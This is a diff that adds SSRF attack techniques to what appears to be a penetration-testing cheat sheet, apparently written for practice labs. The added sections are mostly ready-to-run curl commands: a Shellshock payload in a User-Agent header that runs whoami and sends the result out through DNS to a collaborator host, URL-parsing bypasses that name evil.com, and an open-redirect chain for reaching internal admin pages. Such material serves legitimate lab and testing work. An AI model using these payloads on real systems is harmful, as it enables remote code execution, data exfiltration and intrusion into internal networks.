@@ -98,6 +98,57 @@ Server-Side Request Forgery enables the server to reach networks and services th
 - Allowlist only applied pre-redirect: 302 from attacker → internal host
 - Test multi-hop and protocol switches (http→file/gopher via custom clients)
 
+### Shellshock via SSRF (Practitioner Critical)
+
+When the SSRF target runs a CGI script on an old/vulnerable system, inject Shellshock payload via HTTP headers that the SSRF propagates:
+
+```bash
+# Blind SSRF via Referer header — target internal system with Shellshock
+curl -sk "https://TARGET/product?productId=1" \
+  -H "Referer: http://192.168.0.X:8080/cgi-bin/status" \
+  -H "User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR.oastify.com"
+
+# The SSRF fetches the Referer URL, forwarding the User-Agent header
+# If the internal system has Shellshock, the nslookup command executes
+# Check your collaborator for DNS interactions
+```
+
+**Key insight**: Even when SSRF is blind, Shellshock turns it into RCE on internal hosts.
+
+### URL Parsing Bypass (Practitioner Critical)
+
+Different URL parsers disagree on authority vs path boundaries. Exploit this:
+
+```bash
+# Fragment-based confusion — Ruby/Java parsers may treat #@ differently
+curl -sk "https://TARGET/fetch?url=http://evil.com%23@stock.internal/"
+#  Validator sees: host=evil.com (allowed)
+#  Fetcher sees: host=stock.internal (bypasses allowlist)
+
+# Double URL encoding bypass
+curl -sk "https://TARGET/fetch?url=http://localhost%252523@stock.TARGET/"
+#  First decode: %25 → % → gives %23
+#  Second decode: %23 → # → fragment boundary shifts
+
+# @ confusion
+curl -sk "https://TARGET/fetch?url=http://username@stock.internal/"
+#  Some parsers extract host from before @, others from after
+
+# Embedded credentials bypass
+curl -sk "https://TARGET/fetch?url=http://TARGET%23@evil.com/"
+```
+
+### Whitelist Bypass via Open Redirect
+
+```bash
+# Step 1: Find an open redirect on the allowed domain
+curl -sk "https://stock.TARGET/redirect?url=http://192.168.0.12:8080/admin"
+
+# Step 2: Use it in the SSRF parameter
+curl -sk "https://TARGET/fetch?url=https://stock.TARGET/redirect?url=http://192.168.0.12:8080/admin"
+# Passes allowlist check (stock.TARGET) but redirects to internal host
+```
+
 ### Header and Method Control
 
 - Some sinks reflect or allow CRLF-injection into the request line/headers
